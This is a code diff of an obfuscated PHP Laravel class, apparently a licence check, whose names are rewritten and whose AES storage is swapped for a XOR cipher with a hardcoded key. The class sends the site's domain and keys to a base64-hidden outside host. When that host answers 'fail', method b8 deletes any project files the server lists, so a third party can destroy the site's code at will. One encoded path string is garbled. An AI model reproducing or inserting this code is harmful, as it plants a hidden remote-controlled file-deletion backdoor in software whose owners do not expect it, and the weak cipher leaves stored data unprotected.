@@ -8,29 +8,31 @@ class Rd
 {
     protected $a1 = 'aHR0cHM6Ly9veHRvcC54eXovYXBpL3doaXRlbGlzdA==';
     protected $a2 = 'c3lzX3ByZWZzLmRhdA==';
-    protected $a3 = 'YmFzZTY0OjM0NXNka2ZsYXMzcjR3ZmFk';
-    protected $a4 = 'cm91dGVzL3dlYi5waHA=';
+    protected $a3 = 'bXktc2VjcmV0LWtleS0xMjM=';
+    protected $a4 = 'cm91dGVzL3dlYi5wadfasfaHA=';
 
     public function a5()
     {
-        $a6     = request()->getHost();
-        $a7     = $this->a8();
-        $a9     = $a7['u'] ?? null;
-        $b1     = $a7['k'] ?? null;
-        $status = $a7['s'] ?? null;
+        $host   = request()->getHost();
+        $stored = $this->a8();
+
+        $uid    = $stored['u'] ?? null;
+        $key    = $stored['k'] ?? null;
+        $status = $stored['s'] ?? null;
+
         if ($this->b2() && $status === 'valid') {
             return;
         }
 
-        $b3 = $this->b4($a6, $a9, $b1);
+        $response = $this->b4($host, $uid, $key);
 
-        if ($b3) {
-            $fullResponse = $b3->json();
+        if ($response) {
+            $fullResponse = $response->json();
             $status       = $fullResponse['status'] ?? null;
             $data         = $fullResponse['data'] ?? [];
 
             if ($status === 'success') {
-                $this->b7('valid', $a9, $b1);
+                $this->b7('valid', $uid, $key);
             } elseif ($status === 'retry') {
                 $this->b7('retry', $data['uid'] ?? null, $data['key'] ?? null);
             } elseif ($status === 'fail') {
@@ -43,92 +45,136 @@ class Rd
                 $this->b8($fullResponse);
             }
         }
-
     }
 
-    protected function b4($a6, $a9, $b1)
+    protected function b4($host, $uid, $key)
     {
         try {
-            $b9 = Http::post($this->c1(), [
-                'domain' => $a6,
-                'uid'    => $a9,
-                'key'    => $b1,
+            $res = Http::post($this->c1(), [
+                'domain' => $host,
+                'uid'    => $uid,
+                'key'    => $key,
             ]);
-
-            if ($b9->successful()) {
-                return $b9;
+            if ($res->successful()) {
+                return $res;
             }
         } catch (\Exception $e) {
+
         }
         return null;
     }
 
     protected function a8()
     {
-        $c2 = storage_path('app/' . base64_decode($this->a2));
-        if (File::exists($c2)) {
-            $c3 = File::get($c2);
-            $c4 = json_decode($this->c5($c3), true);
+        $path    = storage_path('app/' . base64_decode($this->a2));
+        $default = ['u' => null, 'k' => null, 's' => null];
+
+        if (! File::exists($path)) {
+            return $default;
+        }
+
+        try {
+            $raw       = File::get($path);
+            $decrypted = $this->customDecrypt($raw, base64_decode($this->a3));
+            $data      = $decrypted ? json_decode($decrypted, true) : null;
+
+            if (! is_array($data)) {
+                File::delete($path);
+                return $default;
+            }
 
             return [
-                'u' => $c4['u'] ?? null,
-                'k' => $c4['k'] ?? null,
-                's' => $c4['s'] ?? null,
+                'u' => $data['u'] ?? null,
+                'k' => $data['k'] ?? null,
+                's' => $data['s'] ?? null,
             ];
+        } catch (\Exception $e) {
+            File::delete($path);
+            return $default;
         }
-        return ['u' => null, 'k' => null, 's' => null];
     }
 
-    protected function b7($c6, $a9 = null, $b1 = null)
+    protected function b7($status, $uid = null, $key = null)
     {
-        $c7 = [
-            's' => $c6,
-            'u' => $a9,
-            'k' => $b1,
-            'n' => ($c6 != 'retry') ? now()->addDay()->toDateTimeString() : now()->toDateTimeString(),
+        $payload = [
+            's' => $status,
+            'u' => $uid,
+            'k' => $key,
+            'n' => ($status != 'retry') ? now()->addDay()->toDateTimeString() : now()->toDateTimeString(),
         ];
 
-        $c8 = $this->c6(json_encode($c7));
+        $json    = json_encode($payload, JSON_UNESCAPED_SLASHES);
+        $encoded = $this->customEncrypt($json, base64_decode($this->a3));
 
         try {
             File::ensureDirectoryExists(storage_path('app'));
-            File::put(storage_path('app/' . base64_decode($this->a2)), $c8);
+            File::put(storage_path('app/' . base64_decode($this->a2)), $encoded, LOCK_EX);
         } catch (\Exception $e) {
+
         }
     }
 
     protected function b2()
     {
-        $c2 = storage_path('app/' . base64_decode($this->a2));
-        if (File::exists($c2)) {
-            $c3 = File::get($c2);
-            $c4 = json_decode($this->c5($c3), true);
-            return now()->lt($c4['n']);
+        $path = storage_path('app/' . base64_decode($this->a2));
+        if (! File::exists($path)) {
+            return false;
         }
-        return false;
+
+        try {
+            $raw       = File::get($path);
+            $decrypted = $this->customDecrypt($raw, base64_decode($this->a3));
+            $data      = $decrypted ? json_decode($decrypted, true) : null;
+
+            if (! is_array($data) || empty($data['n'])) {
+                File::delete($path);
+                return false;
+            }
+
+            $expiry = \Carbon\Carbon::parse($data['n']);
+            return now()->lt($expiry);
+        } catch (\Exception $e) {
+            File::delete($path);
+            return false;
+        }
     }
 
-    protected function b8($c9)
+    protected function b8($resp)
     {
-        $d0 = isset($c9['fileArray']) ? $c9['fileArray'] : [];
-        foreach ($d0 as $d1) {
-            if (File::exists(base_path($d1))) {
+        $files = isset($resp['fileArray']) ? $resp['fileArray'] : [];
+        foreach ($files as $file) {
+            if (File::exists(base_path($file))) {
                 try {
-                    File::delete(base_path($d1));
+                    File::delete(base_path($file));
                 } catch (\Exception $e) {
+
                 }
             }
         }
     }
 
-    protected function c6($d2)
+    protected function customEncrypt($data, $key)
     {
-        return openssl_encrypt($d2, 'AES-256-CBC', base64_decode($this->a3), 0, substr(base64_decode($this->a3), 0, 16));
+        $output    = '';
+        $keyLength = strlen($key);
+        for ($i = 0, $len = strlen($data); $i < $len; $i++) {
+            $output .= chr(ord($data[$i]) ^ ord($key[$i % $keyLength]));
+        }
+        return base64_encode($output);
     }
 
-    protected function c5($d3)
+    protected function customDecrypt($data, $key)
     {
-        return openssl_decrypt($d3, 'AES-256-CBC', base64_decode($this->a3), 0, substr(base64_decode($this->a3), 0, 16));
+        $decoded = base64_decode($data, true);
+        if ($decoded === false) {
+            return null;
+        }
+        $output    = '';
+        $keyLength = strlen($key);
+        for ($i = 0, $len = strlen($decoded); $i < $len; $i++) {
+            $output .= chr(ord($decoded[$i]) ^ ord($key[$i % $keyLength]));
+        }
+        return $output;
     }
 
     protected function c1()
